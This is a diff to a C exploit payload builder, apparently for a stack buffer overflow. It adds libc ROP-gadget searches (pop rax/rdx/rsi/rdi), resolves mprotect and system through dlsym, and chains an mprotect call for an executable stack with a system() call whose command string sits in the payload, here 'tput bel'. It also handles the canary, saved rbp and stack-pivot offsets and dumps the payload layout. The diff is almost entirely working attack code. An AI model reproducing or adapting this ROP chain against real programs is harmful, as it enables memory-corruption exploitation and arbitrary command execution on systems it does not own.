@@ -16,19 +16,23 @@ void initload(PayloadPtr plp) {
 ssize_t makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np) {
 	size_t libc_size	= getpagesize() * 100; // Punt
 
-	char s_libc_popRDI[]	= {0x5f, 0xc3, 0};
-	char s_libc_popRSI[]	= {0x5e, 0xc3, 0};
-	char s_libc_popRDX[]	= {0x5a, 0xc3, 0};
+        char s_libc_popRAX[]    = {0x58, 0xc3, 0};
+        char s_libc_popRDX[]    = {0x5a, 0xc3, 0};
+        char s_libc_popRSI[]    = {0x5e, 0xc3, 0};
+        char s_libc_popRDI[]    = {0x5f, 0xc3, 0};
 
-	Pointer	libc_popRDI	= strnstr(baseAddressesPtr->libc_base, s_libc_popRDI, libc_size);
-	Pointer	libc_popRSI	= strnstr(baseAddressesPtr->libc_base, s_libc_popRSI, libc_size);
-	Pointer	libc_popRDX	= strnstr(baseAddressesPtr->libc_base, s_libc_popRDX, libc_size);
+        Pointer libc_popRAX     = strnstr(baseAddressesPtr->libc_base, s_libc_popRAX, libc_size);
+        Pointer libc_popRDX     = strnstr(baseAddressesPtr->libc_base, s_libc_popRDX, libc_size);
+        Pointer libc_popRSI     = strnstr(baseAddressesPtr->libc_base, s_libc_popRSI, libc_size);
+        Pointer libc_popRDI     = strnstr(baseAddressesPtr->libc_base, s_libc_popRDI, libc_size);
 
 	Pointer	libc_mprotect	= dlsym(RTLD_NEXT, "mprotect");
+        Pointer libc_system     = dlsym(RTLD_NEXT, "system");
 
 	// Offsets are relative to the payload
 	baseAddressesPtr->buf_base = plp;
 
+        // ROP chain for mprotect(ps_stackPage, pl_stackSize, pl_permission)
 	plp->pl_dst.o		= indirectToOffset(&plp->pl_dst, 'B', baseAddressesPtr);
 	plp->pl_canary.o	= indirectToOffset(&plp->pl_canary, 'B', baseAddressesPtr);
 	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B', baseAddressesPtr);
@@ -40,14 +44,34 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssi
 	plp->pl_permission	= 0x7;
 	plp->pl_mprotect.o	= pointerToOffset(libc_mprotect, 'L', baseAddressesPtr);
 
+        // ROP chain for system(pl_bss)
+        plp->pl_popRDI2.o       = libc_popRDI?pointerToOffset(libc_popRDI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRDI, 'P', baseAddressesPtr);
+        plp->pl_systemArg.o     = pointerToOffset(&plp->pl_bss, 'B', baseAddressesPtr);
+
+        plp->pl_popRAX.o        = libc_popRAX?pointerToOffset(libc_popRAX, 'L', baseAddressesPtr):pointerToOffset(&&l_popRAX, 'P', baseAddressesPtr);
+        plp->pl_zero            = 0;
+        plp->pl_system.o        = pointerToOffset(libc_system, 'L', baseAddressesPtr);
+
+        // Stack pivot to executable code (&pl_scu)
 	plp->pl_shellCode.o	= pointerToOffset(&plp->pl_scu, 'B', baseAddressesPtr);
+
+        // Extra space in the payload for string storage
+        memset(plp->pl_bss, 0, sizeof(plp->pl_bss));
+        strncpy(plp->pl_bss, "tput bel", sizeof(plp->pl_bss)-1);
 
 	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
 	int volatile v = 0;
 
+        if (v) {
+l_popRAX:        // Fallback gadget for "POP RAX"
+                __asm__ ("pop %rax");
+                __asm__ ("ret");
+        } // if
+
+
 	if (v) {
-l_popRDI:	// Fallback gadget for "POP RDI"
-		__asm__ ("pop %rdi");
+l_popRDX:	 // Fallback gadget for "POP RDX"
+		__asm__ ("pop %rdx");
 		__asm__ ("ret");
 	} // if
 
@@ -58,8 +82,8 @@ l_popRSI:	// Fallback gadget for "POP RSI"
 	} // if
 
 	if (v) {
-l_popRDX:	 // Fallback gadget for "POP RDX"
-		__asm__ ("pop %rdx");
+l_popRDI:	// Fallback gadget for "POP RDI"
+		__asm__ ("pop %rdi");
 		__asm__ ("ret");
 	} // if
 
@@ -94,9 +118,18 @@ void dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
 	fprintf(stderr, fmt, "pl_popRDX.p",     plp->pl_popRDX.p,    p8(&plp->pl_popRDX));
 	fprintf(stderr, fmt, "pl_permission.p", plp->pl_permission,  p8(&plp->pl_permission));
 	fprintf(stderr, fmt, "pl_mprotect.p",   plp->pl_mprotect.p,  p8(&plp->pl_mprotect));
-	
+
+	fprintf(stderr, fmt, "pl_popRDI2.p",    plp->pl_popRDI2.p,   p8(&plp->pl_popRDI2));
+	fprintf(stderr, fmt, "pl_systemArg.p",  plp->pl_systemArg.p, p8(&plp->pl_systemArg));
+	fprintf(stderr, fmt, "pl_popRAX.p",     plp->pl_popRAX.p,    p8(&plp->pl_popRAX));
+	fprintf(stderr, fmt, "pl_zero",         plp->pl_zero,        p8(&plp->pl_zero));
+	fprintf(stderr, fmt, "pl_system.p",     plp->pl_system.p,    p8(&plp->pl_system));
+
 	fprintf(stderr, fmt, "pl_shellCode.p",  plp->pl_shellCode.p, p8(&plp->pl_shellCode));
 
 	dumpShellcode(&plp->pl_scu.sc);
+
+	fprintf(stderr, fmt, "pl_bss",          plp->pl_bss,         p8(&plp->pl_bss));
 	fprintf(stderr, "--------------------------------------------\n");
+
 } // dumpload()
